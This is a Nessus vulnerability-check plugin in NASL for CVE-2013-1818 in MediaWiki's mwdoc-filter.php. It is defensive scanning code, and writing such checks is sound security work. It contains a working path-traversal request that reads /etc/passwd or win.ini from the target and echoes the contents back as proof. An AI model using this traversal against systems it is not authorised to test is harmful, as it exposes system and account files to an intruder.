#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(65900);
  script_version("$Revision: 1.3 $");
  script_cvs_date("$Date: 2015/06/12 22:35:12 $");

  script_cve_id("CVE-2013-1818");
  script_bugtraq_id(58304);
  script_osvdb_id(90902);

  script_name(english:"MediaWiki mwdoc-filter.php Arbitrary File Access");
  script_summary(english:"Attempts to retrieve a local file.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by an
arbitrary file access vulnerability.");
  script_set_attribute(attribute:"description", value:
"The MediaWiki install hosted on the remote web server is affected by
an arbitrary file access vulnerability due to a failure to restrict
the execution of the 'maintenance/mwdoc-filter.php' script. An
attacker can exploit this issue by sending a specialized URI to read
files located outside the web server's root directory.");
  script_set_attribute(attribute:"see_also", value:"https://bugzilla.wikimedia.org/show_bug.cgi?id=45355");
  # http://lists.wikimedia.org/pipermail/mediawiki-announce/2013-March/000125.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?d4cdf5ec");
  script_set_attribute(attribute:"solution", value:"Upgrade to MediaWiki 1.20.3 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/03/04");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/02/25");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/04/10");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:mediawiki:mediawiki");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2015 Tenable Network Security, Inc.");

  script_dependencies("mediawiki_detect.nasl");
  script_require_keys("installed_sw/MediaWiki", "www/PHP");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "MediaWiki";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);
dir = install['path'];
install_url = build_url(qs:dir, port:port);

# Try to retrieve a local file.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) files = make_list('/windows/win.ini', '/winnt/win.ini');
  else files = make_list('/etc/passwd');
}
else files = make_list('/etc/passwd', '/windows/win.ini', '/winnt/win.ini');

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
# look for section tags in win.ini
file_pats['/winnt/win.ini'] = "^\[[a-zA-Z\s]+\]|^; for 16-bit app support";
file_pats['/windows/win.ini'] = "^\[[a-zA-Z\s]+\]|^; for 16-bit app support";

traversal = mult_str(str:"../",nb:12) + '..';
# Try to exploit the issue to retrieve a file.
foreach file (files)
{
  exploit_url = "/maintenance/mwdoc-filter.php?+" + traversal + file;
  res = http_send_recv3(
    port   : port,
    method : "GET",
    item   : dir + exploit_url,
    exit_on_fail : TRUE
  );

  pat = file_pats[file];
  if (egrep(pattern:pat, string:res[2]))
  {
    vuln = TRUE;
    line_limit = 10;
    break;
  }
}
if (!vuln)
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);

security_report_v4(
  port        : port,
  severity    : SECURITY_WARNING,
  file        : file,
  request     : make_list(install_url + exploit_url),
  output      : chomp(res[2]),
  attach_type : 'text/plain'
);
exit(0);
